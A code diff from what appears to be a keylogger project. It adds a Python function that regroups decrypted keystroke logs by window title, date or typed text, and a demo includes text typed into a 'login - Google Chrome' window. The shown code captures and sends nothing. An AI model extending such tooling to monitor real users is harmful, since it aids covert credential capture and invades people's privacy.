@@ -46,3 +46,46 @@ def decrypt(key: str, data: str) -> str:
         plaintext_bytes.append(xor_byte)
 
     return plaintext_bytes.decode('utf-8', errors='ignore')
+
+
+def group_log_data(data:dict[str:str],by='window') -> dict[str:dict[str:str]]:
+    formated_dict = {}
+    for k,v in data.items():
+        time = k[-8:]
+        date = k[-21:-11]
+        window = k[:-23]
+        text = v
+
+        if by == 'window':
+            main_key = window
+            sub_key = date + ' - '+time
+            value = text
+        elif by == 'date':
+            main_key = date
+            sub_key = window
+            value = text
+        elif by == 'text':
+            main_key = text
+            sub_key = window
+            value = date + ' - '+time
+        else:
+            return
+
+        if main_key not in formated_dict:
+            formated_dict[main_key]={}
+        if sub_key not in formated_dict[main_key]:
+            formated_dict[main_key][sub_key] = ""
+        formated_dict[main_key][sub_key] =value
+    return formated_dict
+
+
+
+if __name__ == '__main__':
+
+    demo = {
+            "KeyloggerProject app.py: 23/02/2025 - 23:25:41": "123",
+            "KeyloggerProject app.py: 18/02/2025 - 23:25:41": "456",
+            "KeyloggerProject config.yaml: 23/02/2025 - 23:26:43": "v",
+            "login - Google Chrome: 23/02/2025 - 23:26:06": "ap"
+        }
+    print(group_log_data(demo,by='text'))
